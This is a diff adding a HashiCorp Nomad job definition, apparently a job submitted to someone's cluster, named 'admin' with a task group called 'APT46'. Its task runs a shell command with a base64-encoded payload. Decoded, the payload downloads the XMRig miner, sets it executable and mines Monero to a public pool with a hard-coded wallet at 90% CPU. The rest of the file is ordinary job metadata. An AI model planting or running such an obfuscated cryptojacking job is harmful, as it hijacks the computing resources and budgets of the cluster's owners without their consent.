@@ -1,0 +1,185 @@
+{
+  "Stop": false,
+  "Region": "global",
+  "Namespace": "default",
+  "ID": "admin",
+  "ParentID": "",
+  "Name": "admin",
+  "Type": "service",
+  "Priority": 50,
+  "AllAtOnce": false,
+  "Datacenters": [
+    "dc1"
+  ],
+  "NodePool": "default",
+  "Constraints": null,
+  "Affinities": null,
+  "Spreads": null,
+  "TaskGroups": [
+    {
+      "Name": "APT46",
+      "Count": 1,
+      "Update": {
+        "Stagger": 30000000000,
+        "MaxParallel": 1,
+        "HealthCheck": "checks",
+        "MinHealthyTime": 10000000000,
+        "HealthyDeadline": 300000000000,
+        "ProgressDeadline": 600000000000,
+        "AutoRevert": false,
+        "AutoPromote": false,
+        "Canary": 0
+      },
+      "Migrate": {
+        "MaxParallel": 1,
+        "HealthCheck": "checks",
+        "MinHealthyTime": 10000000000,
+        "HealthyDeadline": 300000000000
+      },
+      "Constraints": null,
+      "Scaling": null,
+      "RestartPolicy": {
+        "Attempts": 5,
+        "Interval": 1800000000000,
+        "Delay": 15000000000,
+        "Mode": "fail",
+        "RenderTemplates": false
+      },
+      "Disconnect": null,
+      "Tasks": [
+        {
+          "Name": "admin",
+          "Driver": "exec",
+          "User": "",
+          "Config": {
+            "command": "sh",
+            "args": [
+              "-c",
+              "echo -c YXB0LWdldCB1cGRhdGUgLXkgOyBzdWRvIGFwdC1nZXQgdXBkYXRlIC15IDsgYXB0LWdldCBpbnN0YWxsIHdnZXQgOyBzdWRvIGFwdC1nZXQgaW5zdGFsbCB3Z2V0IDsgd2dldCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMjIuMi94bXJpZy02LjIyLjItbGludXgtc3RhdGljLXg2NC50YXIuZ3ogOyBzdWRvIHdnZXQgaHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnL3JlbGVhc2VzL2Rvd25sb2FkL3Y2LjIyLjIveG1yaWctNi4yMi4yLWxpbnV4LXN0YXRpYy14NjQudGFyLmd6IDsgdGFyIC14emYgeG1yaWctNi4yMi4yLWxpbnV4LXN0YXRpYy14NjQudGFyLmd6IDsgY2QgeG1yaWctNi4yMi4yIDsgY2htb2QgNzc3IHhtcmlnIDsgc3VkbyBjaG1vZCA3NzcgeG1yaWcgOyAuL3htcmlnIC1vIHBvb2wuc3VwcG9ydHhtci5jb206NDQzIC11IDQ0VUFTQjdnVFVLRlFxNjlYOENmOGJSNld6YjkxajE3SDU1ajg4QmZabW96WHlLRXNSemU2djRMbldOOHBETUdYOFFOdkdzOXRUYW8xNkNuU1J2QUgxTDc2NjVvR3hNIC0tdGxzIC0tY29pbiBtb25lcm8gLS1jcHUtbWF4LXRocmVhZHMtaGludD05MCAtcCAxOTkuMTY3LjIxMy4xMzg6NDY0Ng=="
+            ]
+          },
+          "Env": null,
+          "Services": null,
+          "Vault": null,
+          "Consul": null,
+          "Templates": null,
+          "Constraints": null,
+          "Affinities": null,
+          "Resources": {
+            "CPU": 0,
+            "Cores": 2,
+            "MemoryMB": 2500,
+            "MemoryMaxMB": 0,
+            "DiskMB": 0,
+            "IOPS": 0,
+            "Networks": null,
+            "Devices": null,
+            "NUMA": null
+          },
+          "RestartPolicy": {
+            "Attempts": 2,
+            "Interval": 1800000000000,
+            "Delay": 15000000000,
+            "Mode": "fail",
+            "RenderTemplates": false
+          },
+          "DispatchPayload": null,
+          "Lifecycle": null,
+          "Meta": null,
+          "KillTimeout": 5000000000,
+          "LogConfig": {
+            "MaxFiles": 10,
+            "MaxFileSizeMB": 10,
+            "Disabled": false
+          },
+          "Artifacts": null,
+          "Leader": false,
+          "ShutdownDelay": 0,
+          "VolumeMounts": null,
+          "ScalingPolicies": null,
+          "KillSignal": "",
+          "Kind": "",
+          "CSIPluginConfig": null,
+          "Identity": {
+            "Name": "default",
+            "Audience": [
+              "nomadproject.io"
+            ],
+            "ChangeMode": "",
+            "ChangeSignal": "",
+            "Env": false,
+            "File": false,
+            "ServiceName": "",
+            "TTL": 0
+          },
+          "Identities": null,
+          "Actions": null,
+          "Schedule": null
+        }
+      ],
+      "EphemeralDisk": {
+        "Sticky": false,
+        "SizeMB": 300,
+        "Migrate": false
+      },
+      "Meta": null,
+      "ReschedulePolicy": {
+        "Attempts": 0,
+        "Interval": 0,
+        "Delay": 30000000000,
+        "DelayFunction": "exponential",
+        "MaxDelay": 3600000000000,
+        "Unlimited": true
+      },
+      "Affinities": null,
+      "Spreads": null,
+      "Networks": null,
+      "Consul": {
+        "Namespace": "",
+        "Cluster": "default",
+        "Partition": ""
+      },
+      "Services": null,
+      "Volumes": null,
+      "ShutdownDelay": null,
+      "StopAfterClientDisconnect": null,
+      "MaxClientDisconnect": null,
+      "PreventRescheduleOnLost": false
+    }
+  ],
+  "Update": {
+    "Stagger": 30000000000,
+    "MaxParallel": 1,
+    "HealthCheck": "",
+    "MinHealthyTime": 0,
+    "HealthyDeadline": 0,
+    "ProgressDeadline": 0,
+    "AutoRevert": false,
+    "AutoPromote": false,
+    "Canary": 0
+  },
+  "Multiregion": null,
+  "Periodic": null,
+  "ParameterizedJob": null,
+  "Dispatched": false,
+  "DispatchIdempotencyToken": "",
+  "Payload": null,
+  "Meta": null,
+  "ConsulToken": "",
+  "ConsulNamespace": "",
+  "VaultToken": "",
+  "VaultNamespace": "",
+  "NomadTokenID": "",
+  "Status": "running",
+  "StatusDescription": "",
+  "Stable": true,
+  "Version": 0,
+  "SubmitTime": 1749680168079347000,
+  "CreateIndex": 2285371,
+  "ModifyIndex": 2303329,
+  "JobModifyIndex": 2285371,
+  "UI": null,
+  "meta": {
+    "index": "2303329"
+  }
+}
